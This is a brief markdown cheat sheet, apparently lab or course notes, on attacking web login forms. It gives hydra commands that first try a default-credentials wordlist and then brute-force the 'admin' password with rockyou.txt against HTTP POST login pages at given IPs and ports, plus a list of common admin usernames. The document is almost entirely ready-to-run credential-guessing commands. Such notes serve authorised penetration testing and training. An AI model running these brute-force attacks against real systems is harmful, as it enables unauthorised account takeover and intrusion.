# Login Form Attacks
***
#### First we perform an attack using default credentials wordlist
#### For example:
```shell
$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 171.111.111.123 -s 1337 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

#### Then if we didn't have any success we can try and brute force the password of a specified user.

### Password Wordlist
#### Example of common usernames used by admins: `admin, administrator, wpadmin, root, adm`
```shell
$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```